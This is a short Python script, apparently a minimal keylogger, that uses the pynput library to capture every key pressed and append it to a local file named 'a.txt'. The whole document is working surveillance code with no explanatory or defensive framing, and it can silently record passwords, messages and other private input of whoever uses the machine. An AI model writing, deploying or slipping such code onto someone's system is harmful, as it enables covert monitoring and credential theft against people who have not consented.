from pynput import keyboard


logfile = "a.txt"


def on_press(key):
    try:
        keydata = key.char
    except AttributeError:
        keydata = f"[{key}]"


    with open(logfile, "a") as f:
        f.write(keydata)


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
